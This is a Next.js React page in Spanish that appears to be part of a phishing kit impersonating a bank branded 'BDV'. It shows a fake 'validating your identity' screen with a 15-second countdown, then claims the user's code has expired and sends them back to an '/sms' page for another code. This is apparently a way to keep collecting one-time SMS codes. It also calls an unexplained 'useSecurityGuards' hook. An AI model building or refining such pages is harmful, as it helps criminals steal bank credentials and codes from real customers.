"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useSecurityGuards } from "@/hooks/useSecurityGuards";

export default function CargandoDos() {
  useSecurityGuards();
  const router = useRouter();
  const [seconds, setSeconds] = useState(15);
  const [hasAlerted, setHasAlerted] = useState(false);

  useEffect(() => {
    const timer = window.setInterval(() => {
      setSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, []);

  useEffect(() => {
    if (seconds === 0 && !hasAlerted) {
      setHasAlerted(true);
      window.alert("Su c\u00F3digo ha expirado, ingrese un nuevo c\u00F3digo");
      router.push("/sms");
    }
  }, [seconds, hasAlerted, router]);

  return (
    <div className="container">
      <div className="left-side">
        <form className="form">
          <div style={{ textAlign: "center" }}>
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/logo.png" alt="BDV" style={{ width: "60%", marginTop: "20px" }} />
          </div>
          <div style={{ width: "100%", textAlign: "center" }}>
            <div className="form-group" style={{ marginBottom: "20px" }}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src="/ldr.gif" alt="Cargando" style={{ width: "100px" }} />
            </div>
          </div>

          <div
            style={{
              width: "100%",
              textAlign: "center",
              fontSize: "12px",
              fontWeight: "bold",
              color: "#999999",
              marginTop: "30px",
              marginBottom: "30px",
            }}
          >
            Estamos validando tu identidad. <br />
            por favor ten cerca tu instrumento de seguridad
            <br />
            <br />
            <label style={{ color: "black" }}>
              Tiempo restante <span aria-live="polite">{seconds}</span> segundos
            </label>
          </div>
        </form>
      </div>
      <div className="right-side" />
    </div>
  );
}
